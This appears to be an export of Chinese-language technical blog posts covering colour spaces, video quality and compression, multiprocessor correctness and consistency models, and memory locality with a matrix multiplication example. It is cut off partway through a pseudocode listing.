<h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>RGB (red, green, blue) 是三原色加色模型（Additive models），用于采样与显示：</p>
<ul>
<li>生成任何一种颜色时，三个分量都需要占用相同的带宽，帧缓冲要求大</li>
<li>修改给定像素的亮度或颜色值时，必须同时从帧缓冲中读出三个分量，然后重新计算亮度和颜色，再将修改写回帧缓冲</li>
</ul>
<h2 id="YCrCb"><a href="#YCrCb" class="headerlink" title="YCrCb"></a>YCrCb</h2><p>在RGB颜色空间中，三个颜色同等重要，需要存储在同等的分辨率上。人类视觉系统（HVS, human visual system）对颜色的敏感度弱于亮度，为了更高效的量化颜色信息，把RGB分量中的亮度信息提取出来作为Y分量，然后取RGB三个分量与Y分量的偏差Cr、Cb、Cg作为色度（chroma）信息，由于Cr+Cb+Cg的和为一个常量，因此可以只存储Cr和Cb分量信息，即得到YCrCb颜色空间。</p>
<div class="tabs" id="ycrcb"><ul class="nav-tabs"><li class="tab active"><a href="#ycrcb-1">ITU-R BT.601-5</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ycrcb-1"><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Y  = 0.299R + 0.587G + 0.114B</span><br><span class="line">Cb = 0.564(B − Y)</span><br><span class="line">Cr = 0.713(R − Y)</span><br><span class="line"></span><br><span class="line">B = Y + 1.772Cb</span><br><span class="line">R = Y + 1.402Cr</span><br><span class="line">G = Y − 0.344Cb − 0.714Cr</span><br></pre></td></tr></table></figure></div></div></div>

<ul>
<li>YCrCb降低了色彩分量的表达的同时，没有对视觉质量产生太大影响</li>
<li>采样到的RGB数据转换为YCrCb后，更有利于存储与传输。在显示图像时，再转换回RGB</li>
</ul>
<h3 id="采样模式"><a href="#采样模式" class="headerlink" title="采样模式"></a>采样模式</h3><img data-src="/images/Media/YCrCb-sampling-pattern-progressive.png" class="" width="509" height="537" title="YCrCb sampling patterns (progressive)">

<ul>
<li><code>4:4:4</code> 每4个Y采样点时由4个Cr和4个Cb采样点</li>
<li><code>4:2:2</code>&#x2F;YUY2 色度采样点在垂直方向上与亮度相同，但在水平方向上只有亮度的一半<ul>
<li><code>1982/CCIR-601</code>定义了基于此方式采样的参数：亮度采样频率为13.5MHz，色度采样频率为6.75MHz，每个采样点为8bit.<ul>
<li>采样码率：<code>13.5 * 8 + 6.75 * 8 * 2 = 216Mb/s</code></li>
</ul>
</li>
</ul>
</li>
<li><code>4:2:0</code>&#x2F;YV12 色度采样点在垂直和水平方向上都只有亮度的一半<ul>
<li>其中的数字0容易误解，其并不表示缺少某个色度分量，历史上只是作为<code>code</code>上的延续标识</li>
<li>YV12的由来：4个Y、1个Cr和1个Cb分量，位深为8时，6*8&#x3D;48bit，每个像素平均48&#x2F;4&#x3D;12bit</li>
</ul>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Image resolution: 720 × 576 pixels</span><br><span class="line">Y resolution: 720 × 576 samples, each represented with 8 bits</span><br><span class="line"></span><br><span class="line">4:4:4 Cr, Cb resolution: 720 × 576 samples, each 8 bits</span><br><span class="line">Total number of bits: 720 × 576 × 8 × 3 = 9953280 bits</span><br><span class="line"></span><br><span class="line">4:2:0 Cr, Cb resolution: 360 × 288 samples, each 8 bits</span><br><span class="line">Total number of bits: (720 × 576 × 8) + (360 × 288 × 8 × 2) = 4976640 bits</span><br><span class="line"></span><br><span class="line">The 4:2:0 version requires half as many bits as the 4:4:4 version.</span><br></pre></td></tr></table></figure>

<img data-src="/images/Media/YV12-samples-to-top-and-bottom-fields.png" class="" width="437" height="408" title="4:2:0 samples to top and bottom fields">

<h1 id="视频质量"><a href="#视频质量" class="headerlink" title="视频质量"></a>视频质量</h1><p><strong>视频质量（Video quality）</strong>是指经过视频传输（transmission）或处理（processing）系统之后，与原始视频相比，感知到的视频特征（characteristic）的退化情况。</p>
<h2 id="动态范围（Dynamic-range）"><a href="#动态范围（Dynamic-range）" class="headerlink" title="动态范围（Dynamic range）"></a>动态范围（Dynamic range）</h2><p>Dynamic range (DR, DNR, or DYR)指某一信号（如sound、light）所能假定的最大值与最小值之间的比率。它可被测量为一个以log10或log2为底的最小和最大信号值之间的对数差值。</p>
<p><strong>动态范围压缩（dynamic range compression）</strong>：原始信号通常具有wide dynamic range，为了利于存储与重建，需要处理成narrower recorded dynamic range。</p>
<h2 id="影响因素"><a href="#影响因素" class="headerlink" title="影响因素"></a>影响因素</h2><p><strong>数字视频（Digital video）</strong>系统中影响视频质量的因素：</p>
<ul>
<li>输入视频信号的特性（characteristics of the input video signal）<ul>
<li>运动量（amount of motion）</li>
<li>空间信息（spatial details）<ul>
<li>模糊度（Blurring）：高空间频率图像细节丢失的结果（锐利的边缘）</li>
<li>大块（Blocking）：图像内部由8、16或32的宏块表示，宏块参数会影响图像质量</li>
<li>重影（Ringing&#x2F;echoing&#x2F;ghosting）：在尖锐的边缘附近以“光环”、“带”或“鬼影”的形式出现.</li>
<li>颜色溢出（Color bleeding）：当图像中一种颜色的边缘无意地出血或重叠成另一种颜色时发生</li>
<li>梯式噪音（Staircase noise）：沿对角线或曲线边阻塞的一种特殊情况</li>
</ul>
</li>
<li>时间信息（Temporal details）<ul>
<li>闪烁（Flickering）：亮度或色彩沿时间维度的频繁变化（细粒闪烁和粗粒闪烁）</li>
<li>蚊式噪声（Mosquito noise）：模糊或在高频内容周围闪烁（前景实体和背景或硬边缘之间的急剧过渡）</li>
<li>悬浮（Floating）：某些区域的错觉运动，而周围的区域保持静止（漂浮在周围的背景之上）</li>
<li>抖动（Jerkiness&#x2F;judder）：由于帧采样而感知到的不均匀或摆动的运动（出现在将24帧的电影转换成3或60帧时）</li>
</ul>
</li>
</ul>
</li>
<li>用于编码和传输的设置（settings used for encoding and transmission）</li>
<li>信道保真度（channel fidelity）</li>
<li>网络性能（network performance）</li>
</ul>
<h2 id="评价方法"><a href="#评价方法" class="headerlink" title="评价方法"></a>评价方法</h2><p><strong>视频质量评价（Video quality evaluation）</strong>用来描述所研究的一组视频序列的质量。</p>
<blockquote>
<p>parametric&#x2F;bitstream-based metrics have also been standardized:</p>
</blockquote>
<ol>
<li><a href="https://www.itu.int/rec/T-REC-P.1201/en">(2012) P.1201 : Parametric non-intrusive assessment of audiovisual media streaming quality</a></li>
<li><a href="https://www.itu.int/rec/T-REC-P.1202">(2012) P.1202 : Parametric non-intrusive bitstream assessment of video media streaming quality</a></li>
<li><a href="https://www.itu.int/rec/T-REC-P.1203.1/en">(2016) P.1203.1 : Parametric bitstream-based quality assessment of progressive download and adaptive audiovisual streaming services over reliable transport - Video quality estimation module</a></li>
<li><a href="https://www.itu.int/rec/T-REC-P.1204.3-202001-I/en">(2020) P.1204.3 : Video quality assessment of streaming services over reliable transport for resolutions up to 4K with access to full bitstream information</a></li>
</ol>
<ul>
<li>主观评价（subjectively）：询问用户（ITU-R 500&#x2F;DSCQS, Double Stimulus Continuous Quality Scale）</li>
<li>客观评价（objectively）：近似主观视频质量评价结果的数学模型<ul>
<li>Full Reference Methods (FR)：比较原始视频信号与接收的视频信号的质量差异。<ul>
<li>经典做法是比较原始视频和接收到视频的每一个像素，不关系中间的编码与传输过程<ul>
<li>最准确（most accurate）</li>
<li>高计算工作量（higher computational effort）</li>
<li>可访问原始视频（availability of the original video）</li>
</ul>
</li>
<li>衡量标准（Metric）<ul>
<li>峰值信噪比（PSNR - Peak Signal-to-Noise Ratio）<ul>
<li>广泛用于图像质量评价，与人眼感知相关性差</li>
</ul>
</li>
<li>结构相似性（SSIM - Structural SIMilarity）<ul>
<li>用于图像质量评价，将图像退化视为结构信息的感知变化</li>
</ul>
</li>
<li>基于运动的视频完整性评估（MOVIE Index - Motion-based Video Integrity Evaluation)<ul>
<li>基于神经科学的模型，用于预测(可能被压缩或扭曲的)电影或视频相对于原始参考视频的感知质量。</li>
</ul>
</li>
<li>视频多方法评估融合（VMAF - Video Multimethod Assessment Fusion）</li>
</ul>
</li>
</ul>
</li>
<li>Reduced Reference Methods (RR)：提取两个视频的一些特征并比较，得出一个质量分数<ul>
<li>与FR模型比较<ul>
<li>较低准确度（lower accuracy）</li>
<li>较低计算工作量（lower computational effort）</li>
<li>不可访问原始视频（not availability of the original video）</li>
</ul>
</li>
<li>衡量标准（Metric）<ul>
<li>SRR - SSIM Reduced-Reference</li>
<li>ST-RRED</li>
</ul>
</li>
</ul>
</li>
<li>No-Reference Methods (NR)：试图在没有任何参考原始信号的情况下评估失真视频的质量<ul>
<li>特点：准确度低于FR与RR，但计算效率更高</li>
<li>Pixel-Based Methods (NR-P)：根据解码后的像素信息分析质量，通常只关注特定的退化类型<ul>
<li>退化类型（degradation types）<ul>
<li>模糊度（blurring）</li>
</ul>
</li>
</ul>
</li>
<li>Parametric&#x2F;Bitstream Methods (NR-B)：根据从传输容器和视频比特流中提取的信息分析质量<ul>
<li>传输容器（transmission container）<ul>
<li>MPEG-TS packet headers</li>
</ul>
</li>
<li>视频比特流（video bitstream）<ul>
<li>运动矢量（motion vectors）</li>
<li>量化参数（quantization parameters）</li>
</ul>
</li>
<li>特点：无需解码、效率高但很不准确</li>
</ul>
</li>
<li>Hybrid Methods (Hybrid NR-P-B)：结合从比特流提取的参数与解码的视频信号分析质量</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="峰值信噪比"><a href="#峰值信噪比" class="headerlink" title="峰值信噪比"></a>峰值信噪比</h3><p><strong>峰值信噪比（PSNR - Peak Signal-to-Noise Ratio）</strong>指信号的最大可能功率与影响信号表现保真度的干扰噪声功率之间的比值。</p>
<p><a href="/Media/FFmpeg#psnr"><strong>计算峰值信噪比 ffmpeg&#x2F;filter&#x2F;psnr</strong></a></p>
<h1 id="视频编码"><a href="#视频编码" class="headerlink" title="视频编码"></a>视频编码</h1><p>视频编码（video coding）或者叫视频压缩（Video compression）是将数字视频处理成适合传输或存储的形式，减少冗余字节量。在图像与视频信息的压缩上，使用<code>JPEG-LS</code>的无损（lossless）压缩算法通常只能达到3~4倍的压缩量，有损（lossy）压缩算法基于去除主观冗余的原则，可以在不显著影响观感的情况下，以视觉质量的损失换取更高的压缩比。</p>
<ul>
<li>冗余信息（redundancy）<ul>
<li>时间上（temporal）<ul>
<li>时间顺序上连续的帧，通常是高度相关的，特别是当采样率或帧率很高的时候</li>
</ul>
</li>
<li>空间上（spatial）<ul>
<li>相邻的像素(样本)之间通常有很高的相关性</li>
</ul>
</li>
</ul>
</li>
<li>编解码器（codec）</li>
</ul>
<h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><p>编码器（encoder）：将源数据进行压缩数据</p>
<pre class="mermaid">
graph LR
VideoSource[视频源数据] --&gt; PredictionModel[预测模型] --&gt; |残差帧| SpatialModel[空间模型]
SpatialModel --&gt; |残差帧经变换和量化后的系数| EntropyEncoder[熵编码器] --&gt; CodedVideo[编码数据]
StoredCodedData[引用的已编码数据] --&gt; PredictionModel --&gt; |预测类型和运动补偿参数| EntropyEncoder
</pre>

<h3 id="预测模型"><a href="#预测模型" class="headerlink" title="预测模型"></a>预测模型</h3><p>预测模型（prediction model）</p>
<ul>
<li>输入信息为未压缩的视频源数据，</li>
<li>利用相邻视频帧或相邻图像样本之间的相似性来减少冗余<ul>
<li>帧间预测（inter prediction）| 时域（temporal）预测 | 运动补偿（motion compensation）<ul>
<li>利用前后引用帧（reference frame）之间的差异预测当前视频帧，差异类型有：<ul>
<li>运动（motion）：可用帧间像素的移动量，可用光流（optical flow）表示<ul>
<li>刚体运动：例如移动的车辆</li>
<li>可变形的运动：例如说话的人</li>
<li>镜头移动：例如PTZ变换</li>
</ul>
</li>
<li>未覆盖区域（uncovered regions）：没有被运动物体遮蔽的背景区域</li>
<li>光线变化（lighting changes）</li>
</ul>
</li>
<li>光流（optical flow）计算复杂，且也需要网络传输，在实际中应用少</li>
<li>基于块（block-based）的运动估计与补偿（estimation and compensation）：<ol>
<li>在当前帧中选取M*N的采样点作为块</li>
<li>在引用帧（reference frame）的搜索区域中寻找相似的块（称为候选区域或预测器），从当前块减去候选块得到残差块（称为运动补偿），能量最小的残差块就是最佳匹配，寻找最佳匹配的过程即为运动估计。</li>
<li>计算当前块与最佳匹配块位置上的偏差，得到运动矢量（motion vector）</li>
<li>残差块和运动矢量经熵编码后一起被传输</li>
<li>解码器通过运动矢量重建预测块，然后将残差帧加到预测器上得到原始的块<img data-src="/images/Media/motion-estimation.png" class="" width="700" height="400" title="Motion Estimation"></li>
</ol>
</li>
</ul>
</li>
<li>帧内预测（intra prediction）| 空间预测（spatial prediction）| DPCM (Differential Pulse Code Modulation)<ul>
<li>利用周边视频块（block of video data）预测当前块<img data-src="/images/Media/spatial-prediction.png" class="" width="565" height="366" title="Spatial Prediction (DPCM)">
<ul>
<li>编码器基于之前编码的像素<em>A</em>、<em>B</em>、<em>C</em>的某种组合预测当前像素<em>X</em><ol>
<li>假定编码器预测<code>P(X) = (2A + B + C) / 4</code></li>
<li>计算残差帧<code>R(X) = X - P(X)</code>，经编码、传输</li>
<li>解码器解码后得到<code>R(X)</code>和同样的预测<code>P(X) = (2A + B + C) / 4</code></li>
<li>解码器重建像素<code>X = R(X) + P(X)</code></li>
</ol>
</li>
<li>压缩效率取决于<code>P(X)</code>的预测精度，预测越准确，残差帧越小</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>输出<ul>
<li>预测类型和参数</li>
<li>残差帧（residual frame，当前帧实际值减去预测值后的差值，得到灰度图像）</li>
</ul>
</li>
<li>编码器（encoder）预测时只能使用解码时可以利用的信息，使得解码器与编码器有同样的预测结果</li>
</ul>
<h3 id="空间模型"><a href="#空间模型" class="headerlink" title="空间模型"></a>空间模型</h3><p>空间模型（spatial model）</p>
<ul>
<li>输入为残差帧</li>
<li>将残差帧进行变换（transform），以获取更紧凑的表示，必须可逆，计算过程可实现<ul>
<li>基于块（block-based）的变换，内存占用低，块边缘易产生伪影<ul>
<li>KLT (Karhunen-Loeve Transform)</li>
<li>SVD (Singular Value Decomposition)</li>
<li>DCT (Discrete Cosine Transform)</li>
</ul>
</li>
<li>基于图像（image-based）的变换，内存占用高，适合于静态图像<ul>
<li>DWT (Discrete Wavelet Transform)</li>
</ul>
</li>
</ul>
</li>
<li>对变换后的数据进行量化（quantization），将值限制在更小的范围内<ul>
<li>标量量化（scalar quantizer）：一对一映射<ul>
<li>前向量化器（FQ, forward quantizer FQ）<ul>
<li>将多数不重要的系数映射到零值，同时保留少量的重要系数为非零值，因此输出是一个主要包含零的稀疏数组</li>
<li>步长（step size）越大，量化后的值范围越小，压缩率越高</li>
</ul>
</li>
</ul>
</li>
<li>矢量量化（vector quantizer）：多对多映射</li>
</ul>
</li>
<li>对非零值进行重排序（reordering），并对零值高效编码，以获取更紧凑的表示</li>
<li>输出为残差帧经变换、量化后得到的一组系数（quantized transform coefficients）</li>
</ul>
<h3 id="熵编码"><a href="#熵编码" class="headerlink" title="熵编码"></a>熵编码</h3><p>熵编码（entropy coding）：将表示视频序列的数据转换为适合传输或存储的字节流形式</p>
<ul>
<li>算法<ul>
<li>哈夫曼编码（huffman coding）</li>
</ul>
</li>
<li>输出压缩字节流（bit stream）<ul>
<li>头信息（header information）</li>
<li>编码预测参数（coded prediction parameters）</li>
<li>编码残差系数（coded residual coefficients）</li>
</ul>
</li>
</ul>
<h2 id="解码器"><a href="#解码器" class="headerlink" title="解码器"></a>解码器</h2><p>解码器（decoder）：将压缩数据恢复成源数据</p>
<ul>
<li>反向量化器（IQ, inverse quantizer）</li>
</ul>
<h1 id="素材"><a href="#素材" class="headerlink" title="素材"></a>素材</h1><p><a href="https://www.hdpvrcapture.com/wordpress/?page_id=97">Sample Recordings</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="#">THE H.264 ADVANCED VIDEO COMPRESSION STANDARD, Second Edition, 2010, Iain E. Richardson</a></p>
]]></content>
      <categories>
        <category>Media</category>
      </categories>
      <tags>
        <tag>VideoBasic</tag>
      </tags>
  </entry>
  <entry>
    <title>多处理器计算模型</title>
    <url>/Multiprocessor/ComputationalModel.html</url>
    <content><![CDATA[<p>大多数困扰多处理器程序员的问题都源自于计算模型本身的限制，理解可计算性的关键在于描述和证明特定程序的实际执行行为，即程序正确性问题。</p>
<span id="more"></span>

<ul>
<li>程序正确性（program correctness）：<ul>
<li>安全属性（safety）：表明“坏事”永远不会发生，主要与顺序正确性（Sequential correctness）有关，例如，即使停电，交通灯也不会在各个方向显示绿色。</li>
<li>活性属性（liveness）：表示某一特定的好事将会发生，例如，红灯最终会变成绿灯。</li>
</ul>
</li>
</ul>
<h1 id="Amdahl定律"><a href="#Amdahl定律" class="headerlink" title="Amdahl定律"></a>Amdahl定律</h1><p>理想情况下，从单处理器升级到n路关联多处理器应该提高了n倍的计算能力。实际中，因为大多数计算问题无法有效地并行化（不考虑处理器之间通信和协作开销的情况下）。Amdahl定律（Amdahl’s Law）由Gene Amdahl在1967年提出，在并行计算中，常用于预测使用多处理器时的理论加速。其揭示了这样一个概念：<strong>完成复杂工作可获得的加速比是有限的，受限于这个工作中必须被串行执行的部分。</strong></p>
<p>  $加速比S &#x3D; \frac{1个处理器完成的时间}{n个处理器并发完成的时间} &#x3D; \frac{串行执行耗时(1)}{串行部分耗时(1-p)+并行部分耗时(\frac{p}{n})} &#x3D; \frac{1}{1-p+\frac{p}{n}}$</p>
<ul>
<li>5个人粉刷5个房间，每个房间大小都一样，假定每个房间是1个单位，则有5个单位可以并行粉刷，即并行部分p&#x3D;5&#x2F;5&#x3D;1：<br>$加速比S &#x3D; \frac{1个人耗时}{5个人耗时} &#x3D; \frac{1}{1-1+\frac{1}{5}} &#x3D; 5$</li>
<li>5个人粉刷5个房间，其中4个小房间占4个单位，1个大房间占2个单位，则有6个单位可以并行粉刷，即并行部分p&#x3D;5&#x2F;6：<br>$加速比S &#x3D; \frac{1个人耗时}{5个人耗时} &#x3D; \frac{1}{\frac{1}{6}+\frac{1}{6}} &#x3D; 3$</li>
</ul>
<blockquote>
<p>仅仅微小的失衡就使5个人粉刷房屋只能获得3倍的加速比，这几乎是预期值的一半。</p>
</blockquote>
<h1 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h1><p>互斥（Mutual Exclusion）是多处理器程序设计中最常见的一种协作方式。</p>
<p><strong>特性</strong>：</p>
<ul>
<li><strong>互斥</strong>（Mutual Exclusion）：<ul>
<li>不同线程拥有临界区（Critical section）的时间片不会重叠。</li>
<li>是一种安全属性，保证了计算结果的正确性。</li>
</ul>
</li>
<li><strong>无死锁</strong>（Deadlock-Freedom）：<ul>
<li>如果一个线程正在尝试获得一个锁，那么总会成功地获得这个锁。</li>
<li>是一种活性属性，表明系统决不会”冻结“。</li>
<li>即使一个程序中所使用的每个锁都满足无死锁特性，该程序也可能死锁。例如：线程A和B共享锁L0和L1，首先A获得L0而B获得L1，然后A试图取L1而B试图获取L0，此时两个线程都需要对方释放锁，从而陷入等待发生死锁。</li>
</ul>
</li>
<li><strong>无饥饿</strong>（Starvation-Freedom）：<ul>
<li>每一个试图获得锁的线程最终都能成功（无饥饿意味着无死锁）。</li>
<li>是一种弱（weakness）属性，因为不保证线程在进入临界区以前需要等待多长时间。</li>
</ul>
</li>
</ul>
<h1 id="并发数据结构"><a href="#并发数据结构" class="headerlink" title="并发数据结构"></a>并发数据结构</h1><p><a href="https://www.microsoft.com/en-us/research/uploads/prod/2016/12/How-to-Make-a-Multiprocessor-Computer-That-Correctly-Executes-Multiprocess-Programs.pdf">Sequential consistency: How to Make a Multiprocessor Computer That Correctly Executes Multiprocess Programs, 1979</a><br><a href="http://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf">Linearizability: A Correctness Condition for Concurrent Objects, 1990</a><br><a href="http://www.cs.tau.ac.il/~shanir/concurrent-data-structures.pdf">concurrent-data-structures, Mark Moir and Nir Shavit, 2007</a><br><a href="http://coldattic.info/post/88/">Consistency Models Explained Briefly, 2012</a></p>
<p>并发数据结构（Concurrent&#x2F;Shared data structure）是供多线程(或进程)访问的一种存储和组织数据的特殊方式，通常必须让多个线程对同时访问和修改数据的请求结果达成一致。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>如果一个方法对所有的状态都给出了定义，则称该方法是<strong>完全的</strong>（total），否则称为<strong>部分的</strong>（partial）。</p>
<pre><code>例如，定义FIFO队列：总是能够使得一个元素入队，但是只能从非空队列中出队。
    enqueue入队方法是完全的，因为它对队列的所有状态都定义了执行效果；
    dequeue出队方法是部分的，因为它只定义了非空队列的执行效果。
</code></pre>
<p><strong>未决调用</strong>（pending invocation）：一个方法的调用事件发生了，但应答事件还未出现。<br><strong>非阻塞</strong>（non-blocking）：一个完全方法的未决调用不需要等待另一个未决调用完成。<br><strong>可复合的</strong>（compositional）：如果一个正确性性质P是复合的，当系统中的每个对象满足P时，系统作为一个整体满足P。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><ul>
<li>安全属性：必须捕获不同线程的方法调用（method calls）之间可能交错的行为。<ul>
<li><strong>静态一致性</strong>（Quiescent consistency）：<ul>
<li>方法调用应该按照一个接一个的顺序出现。如果一个对象没有挂起的方法调用，它就是静态的。<ul>
<li>例如，在FIFO队列中，A和B并发入队7和-3，然后出队时预期为7或-3，而不能是它们的组合-7或3。</li>
</ul>
</li>
<li>被静态分割的方法调用间应该反映出确定的调用顺序。<ul>
<li>例如，在FIFO队列中，A和B并发入队x和y，完成后队列变为静态，然后C入队z。虽然不能预测x和y入队的先后顺序，但一定在z之前入队。</li>
</ul>
</li>
<li>静态一致性是一种非阻塞的正确性条件，且是可复合的。</li>
</ul>
</li>
<li><strong>顺序一致性</strong>（Sequential consistency）：<blockquote>
<p><strong>程序次序</strong>（program order）指单线程的方法调用次序。<br>在并发执行中，方法调用的行为就像它们以程序次序运行的顺序一样。因此，只要找到一种<em><strong>符合程序次序</strong></em>的执行顺序，且保留<em><strong>各线程内部原有的执行顺序</strong></em>，即说明满足顺序一致性。</p>
</blockquote>
<ul>
<li>方法调用应该按照一个接一个的顺序出现。</li>
<li>方法调用应该呈现出按照程序次序调用的执行效果。<ul>
<li>例如，在FIFO队列中，A入队x同时B入队y，然后A出队y同时B出队x。并发执行中，存在两种可能的执行顺序：<br>  1. A入队x，B入队y，B出队x，A出队y；<br>  2. B入队y，A入队x，A出队y，B出队x；<br>这两种执行顺序都与方法调用的程序次序效果一致，任意一个都能说明满足顺序一致性。</li>
</ul>
</li>
<li>顺序一致性是一种非阻塞的正确性条件，但不是可复合的。</li>
</ul>
</li>
<li><strong>可线性化</strong>（Linearizability）：<blockquote>
<p>只要找到一种<em><strong>符合程序次序</strong></em>的执行顺序，且保留<em><strong>各线程内部原有的执行顺序</strong></em>以及<em><strong>各线程之间的执行顺序</strong></em>，即说明满足线性一致性。</p>
</blockquote>
<ul>
<li>方法调用应该按照一个接一个的顺序出现。</li>
<li>方法调用应该呈现出按照程序次序调用的执行效果，且每个方法调用应该在调用和响应之间的某个时刻立即生效。<ul>
<li>线性化点（Linearization Points）指方法生效的执行位置，用于说明并发对象是可线性化的。<br>  1. lock-based实现时，每个临界区作为线性化点；<br>  2. lock-free实现时，通常指一个简单的步骤，此时方法调用的效果对其他方法调用是可见的。</li>
</ul>
</li>
<li>可线性化是一种非阻塞的正确性条件，且是可复合的。</li>
</ul>
</li>
</ul>
</li>
<li>活性属性：体现在数据结构的定义上，其方法调用可以是阻塞的（blocking），也可以是非阻塞的（non-blocking），或者它们的混合。</li>
</ul>
]]></content>
      <categories>
        <category>Multiprocessor</category>
      </categories>
      <tags>
        <tag>ComputationalModel</tag>
      </tags>
  </entry>
  <entry>
    <title>参考局部性原则</title>
    <url>/Multiprocessor/LocalityPrinciple.html</url>
    <content><![CDATA[<p><strong>参考局部性原则</strong>（<code>principle of locality of reference</code>）是指处理器短时间内重复访问相邻存储位置的趋势。</p>
<span id="more"></span>

<h1 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h1><ul>
<li><strong>时间局部性</strong>（<code>Temporal locality</code>）<br>处理器在时间片$t_i$访问内存位置$m_j$，那么后续时间片$t_{n&gt;i}$很可能再次访问内存位置$m_j$。</li>
<li><strong>空间局部性</strong>（<code>Spatial locality</code>）<br>处理器在时间片$t_i$访问内存位置$m_j$，那么后续时间片$t_{n&gt;i}$很可能再次访问邻近$k$范围内存位置$m_{j \pm k}$。</li>
<li><strong>分支局部性</strong>（<code>Branch locality</code>）<br>处理器在时空坐标系中，预期路径只有少数可能的选择时（预期路径对应的内存位置可能相隔很远）。</li>
</ul>
<h1 id="硬件优化"><a href="#硬件优化" class="headerlink" title="硬件优化"></a>硬件优化</h1><h2 id="内存层次结构"><a href="#内存层次结构" class="headerlink" title="内存层次结构"></a>内存层次结构</h2><p>内存层次结构（<code>memory hierarchy</code>）是一种硬件优化，具有<strong>时间</strong>局部性和<strong>空间</strong>局部性的优点。</p>
<ul>
<li><code>CPU</code>寄存器（<code>CPU registers</code>）</li>
<li><code>CPU</code>缓存（<code>CPU caches</code>）</li>
<li>内存（<code>RAM，Main physical memory</code>）</li>
<li>磁盘（<code>virtual memory, file system</code>）</li>
<li>远程内存</li>
</ul>
<h3 id="CPU缓存"><a href="#CPU缓存" class="headerlink" title="CPU缓存"></a>CPU缓存</h3><p><img data-src="/images/Multiprocessor/CpuCacheOper.jpg"></p>
<ul>
<li><strong>时间局部性</strong>：cpu从当前内存位置（<code>Current Memory Location</code>）抓取数据后，也将这些数据缓存（<code>Cache Memory</code>）起来以供后续再次访问它。</li>
<li><strong>空间局部性</strong>：cpu从当前内存位置（<code>Current Memory Location</code>）抓取数据时，也会抓取当前位置附近的数据进行缓存（<code>Cache Memory</code>）以供后续再次访问它。</li>
</ul>
<p><img data-src="/images/Multiprocessor/CpuCacheHit.jpg"></p>
<p><code>cpu</code>抓取数据过程：</p>
<ol>
<li>首先尝试从高速缓存（<code>Cache Memory</code>）中抓取数据，如果寻找到即处理它，这个过程称为<strong>缓存命中</strong>（<code>Cache Hit</code>）；</li>
<li>如果未从高速缓存（<code>Cache Memory</code>）中抓到数据，就从内存（<code>Main Memory</code>）中抓取它，这个过程称为<strong>缓存丢失</strong>（<code>Cache Miss</code>）。</li>
</ol>
<p><strong>性能评估</strong>：</p>
<ul>
<li>命中率（<code>Hit Ratio</code>）： $h&#x3D;\frac{Hit}{Hit+Miss}$</li>
<li>平均访问时间（<code>Average time to access Memory</code>）：$T_{avg}&#x3D;h \times T_c + (1-h) \times (T_c+T_m)$<br>其中，$T_c$是访问缓存耗时，$T_m$为访问内存耗时。</li>
</ul>
<h1 id="软件优化"><a href="#软件优化" class="headerlink" title="软件优化"></a>软件优化</h1><h2 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h2><p>定义<code>A=&#123;n×m&#125;</code>矩阵，<code>B=&#123;m×p&#125;</code>矩阵，则相乘可得<code>C=AB=&#123;n×p&#125;</code>矩阵，<br>$$ C<br>    \begin{pmatrix}<br>    c_{11} &amp; c_{12} &amp; \cdots &amp; c_{1p} \\<br>    c_{21} &amp; c_{22} &amp; \cdots &amp; c_{2p} \\<br>    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>    c_{n1} &amp; c_{n2} &amp; \cdots &amp; c_{np} \\<br>    \end{pmatrix}<br>&#x3D; A<br>    \begin{pmatrix}<br>    a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1m} \\<br>    a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2m} \\<br>    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>    a_{n1} &amp; a_{n2} &amp; \cdots &amp; a_{nm} \\<br>    \end{pmatrix}<br>× B<br>    \begin{pmatrix}<br>    b_{11} &amp; b_{12} &amp; \cdots &amp; b_{1p} \\<br>    b_{21} &amp; b_{22} &amp; \cdots &amp; b_{2p} \\<br>    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>    b_{m1} &amp; b_{m2} &amp; \cdots &amp; b_{mp} \\<br>    \end{pmatrix}<br>$$</p>
<p>$$c_{ij}&#x3D;a_{i1}b_{1j}+a_{i2}b_{2j}+\cdots+a_{im}b_{mj}&#x3D;\sum_{k&#x3D;1}^m a_{ik}b_{kj}，其中i&#x3D;1 \cdots n, j&#x3D;1 \cdots p$$</p>
<p><strong>矩阵乘法算法</strong>（<code>Matrix multiplication algorithm</code>）</p>
<p>当<code>A、B、C</code>矩阵很大，以至于<code>CPU</code>缓存空间无法容纳每个矩阵时，对于将<strong>最后一个维度作为连续的数组元素</strong>进行存储的语言，可以利用参考局部性原则优化算法性能:</p>
<ul>
<li><p>空间局部性优化：在计算过程中，尽可能的连续访问相邻元素或者降低需要缓存的数据大小，以提高缓存命中率。</p>
<figure class="highlight ps"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 迭代1：</span></span><br><span class="line"><span class="comment"># A[i][k]中k是最后一个维度，因此k邻近元素会缓存，下次计算时会触发缓存命中过程；</span></span><br><span class="line"><span class="comment"># B[k][j]中k不是最后一个维度，下次计算时元素位置跳跃大，因此会触发缓存丢失过程。</span></span><br><span class="line">MatrixMulti(A[<span class="type">n</span>][<span class="type">m</span>], B[<span class="type">m</span>][<span class="type">p</span>])</span><br><span class="line">    C[<span class="type">n</span>][<span class="type">p</span>]: array，=empty</span><br><span class="line">    <span class="keyword">for</span> i=<span class="number">1</span> to n</span><br><span class="line">        <span class="keyword">for</span> j=<span class="number">1</span> to p</span><br><span class="line">            <span class="keyword">for</span> k=<span class="number">1</span> to m</span><br><span class="line">                C[<span class="type">i</span>][<span class="type">j</span>] += A[<span class="type">i</span>][<span 